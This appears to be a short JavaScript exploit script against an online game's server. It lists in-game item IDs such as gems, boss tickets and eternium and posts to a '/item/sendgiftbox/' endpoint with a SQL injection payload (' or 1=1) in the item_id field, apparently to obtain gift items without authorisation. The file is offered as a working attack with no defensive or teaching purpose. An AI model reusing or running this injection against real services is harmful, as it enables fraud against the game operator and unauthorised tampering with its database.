//

const send = require("./lib/send")

// 1061 - eternium
// 386 - extract tools
// 4327 - gift 1 mage boss ticket
// 4329 - gift 1 warrior boss ticket
// 10074 - gift 25 gems
// 10208 - gift 50 gems
// 3833 - event campaign ticket

// 1196833 - LEMIX
// 1820427 - REFORGE

send({
    url: "/item/sendgiftbox/",
    body: { // %5b%5d = []
        item_id: "4327'\" or 1=1",
        "hero_ids[]": 1,
        "amounts[]": 2,
    },
}).then(console.log)
